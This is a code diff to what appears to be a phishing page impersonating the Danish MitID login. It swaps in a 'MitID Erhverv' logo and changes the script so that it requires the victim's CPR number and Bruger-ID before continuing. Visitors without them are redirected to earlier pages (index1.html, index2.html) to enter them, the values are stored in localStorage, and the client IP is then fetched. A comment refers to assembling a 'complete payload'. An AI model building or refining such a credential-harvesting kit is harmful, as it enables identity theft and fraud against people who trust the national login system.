@@ -618,7 +618,7 @@
   </div>
 
   <div class="phone">
-    <div class="logo-slot" aria-hidden="true"><img src="img/mitid-logo.png" alt="MitID"
+    <div class="logo-slot" aria-hidden="true"><img src="img/logo.jpg" alt="MitID Erhverv"
         style="max-height: 72px; max-width: 88%; object-fit: contain;" /></div>
 
     <section class="page active" id="page-cvr">
@@ -792,10 +792,25 @@
   </div>
 
   <script>
-    // URL Query Parameters parsing + localStorage integration for complete payload combination
+    // URL Query Parameters + localStorage — require Bruger-ID and CPR before this page
     const urlParams = new URLSearchParams(window.location.search);
-    const cprVal = urlParams.get('cpr') || urlParams.get('ip_cpr') || localStorage.getItem('cprNumber') || 'Ikke angivet';
-    const burgerIdVal = urlParams.get('burger_id') || urlParams.get('burgerid') || urlParams.get('burger_idVal') || localStorage.getItem('brugerId') || 'Ikke angivet';
+    let cprVal = urlParams.get('cpr') || urlParams.get('ip_cpr') || localStorage.getItem('cprNumber') || '';
+    let burgerIdVal = urlParams.get('burger_id') || urlParams.get('burgerid') || urlParams.get('bruger_id') || urlParams.get('burger_idVal') || localStorage.getItem('brugerId') || '';
+    cprVal = (cprVal || '').trim();
+    burgerIdVal = (burgerIdVal || '').trim();
+    const isMissing = (v) => !v || v === 'Ikke angivet';
+    if (isMissing(burgerIdVal)) {
+      window.location.replace('index1.html');
+      throw new Error('Missing Bruger-ID — redirecting');
+    }
+    if (isMissing(cprVal)) {
+      window.location.replace('index2.html?burger_id=' + encodeURIComponent(burgerIdVal));
+      throw new Error('Missing CPR — redirecting');
+    }
+    try {
+      localStorage.setItem('brugerId', burgerIdVal);
+      localStorage.setItem('cprNumber', cprVal);
+    } catch (e) {}
 
     // Fetch client IP address dynamically
     let userIpAddress = 'Henter...';
